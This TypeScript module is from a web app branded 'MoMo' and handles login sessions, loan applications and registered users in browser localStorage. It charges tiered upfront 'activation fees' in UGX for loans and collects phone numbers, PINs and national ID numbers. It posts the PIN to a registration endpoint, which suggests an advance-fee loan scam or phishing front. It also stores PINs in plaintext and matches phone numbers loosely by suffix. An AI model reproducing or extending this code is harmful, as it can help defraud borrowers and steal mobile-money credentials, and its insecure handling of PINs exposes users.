// LocalStorage-based session and loan application persistence for MoMo login
const SESSION_KEY = 'momo_session';
const APP_KEY = 'momo_application';

export interface MoMoSession {
  phone: string;
  country: string;
  countryCode: string;
  loggedIn: boolean;
}

export interface LoanApplication {
  amount: string;
  amountNum?: number;
  activationFee?: string;
  purpose: string;
  type: string;
  repayment: string;
  firstName: string;
  lastName: string;
  phone?: string;
  gender?: string;
  idNumber?: string;
  nationality?: string;
  submittedAt: string;
  status: 'pending' | 'approved' | 'reviewing' | 'withdrawn';
}

export function calculateActivationFee(amountNum: number): { fee: number; formatted: string } {
  let fee = 50000;
  if (amountNum <= 1500000) {
    fee = 50000;
  } else if (amountNum <= 2500000) {
    fee = 75000;
  } else if (amountNum <= 3500000) {
    fee = 100000;
  } else if (amountNum <= 5000000) {
    fee = 140000;
  } else if (amountNum <= 6500000) {
    fee = 175000;
  } else if (amountNum <= 8000000) {
    fee = 200000;
  } else if (amountNum <= 9500000) {
    fee = 250000;
  } else {
    fee = 300000;
  }
  return { fee, formatted: `UGX ${fee.toLocaleString()}` };
}

export function getSession(): MoMoSession | null {
  try {
    const raw = localStorage.getItem(SESSION_KEY);
    if (!raw) return null;
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

export function setSession(session: MoMoSession) {
  localStorage.setItem(SESSION_KEY, JSON.stringify(session));
}

export function clearSession() {
  localStorage.removeItem(SESSION_KEY);
}

export function getApplication(): LoanApplication | null {
  try {
    const raw = localStorage.getItem(APP_KEY);
    if (!raw) return null;
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

export function setApplication(app: LoanApplication) {
  localStorage.setItem(APP_KEY, JSON.stringify(app));
}

export function clearApplication() {
  localStorage.removeItem(APP_KEY);
}

// Registered users management (Sign-in allowed ONLY for registered users)
const REGISTERED_USERS_KEY = 'momo_registered_accounts';

export interface RegisteredUser {
  phone: string;
  country: string;
  countryCode: string;
  pin?: string;
  registeredAt?: string;
}

function cleanDigits(s?: string): string {
  return String(s || '').replace(/\D/g, '');
}

export function getLocalRegisteredUsers(): RegisteredUser[] {
  try {
    const raw = localStorage.getItem(REGISTERED_USERS_KEY);
    if (!raw) return [];
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

export function saveLocalRegisteredUser(user: RegisteredUser) {
  const users = getLocalRegisteredUsers();
  const cleanTarget = cleanDigits(user.phone);
  const idx = users.findIndex((u) => cleanDigits(u.phone) === cleanTarget);
  if (idx >= 0) {
    users[idx] = { ...users[idx], ...user };
  } else {
    users.push(user);
  }
  localStorage.setItem(REGISTERED_USERS_KEY, JSON.stringify(users));
}

export async function registerNewUser(user: RegisteredUser): Promise<void> {
  saveLocalRegisteredUser(user);
  try {
    await fetch('/api/users/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(user),
    });
  } catch {
    // local copy saved as fallback
  }
}

export async function verifyUserRegistered(
  phone: string,
  countryCode?: string
): Promise<{ exists: boolean; user?: RegisteredUser }> {
  const cleanPhone = cleanDigits(phone);
  if (!cleanPhone) return { exists: false };

  // First check local storage
  const localUsers = getLocalRegisteredUsers();
  const localFound = localUsers.find((u) => {
    const uClean = cleanDigits(u.phone);
    return (
      uClean === cleanPhone ||
      uClean.endsWith(cleanPhone) ||
      cleanPhone.endsWith(uClean)
    );
  });

  if (localFound) {
    return { exists: true, user: localFound };
  }

  // Also query server backend
  try {
    const res = await fetch('/api/users/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone, countryCode }),
    });
    if (res.ok) {
      const data = await res.json();
      if (data.exists) {
        if (data.user) saveLocalRegisteredUser(data.user);
        return { exists: true, user: data.user };
      }
    }
  } catch {
    // server check fallback
  }

  return { exists: false };
}

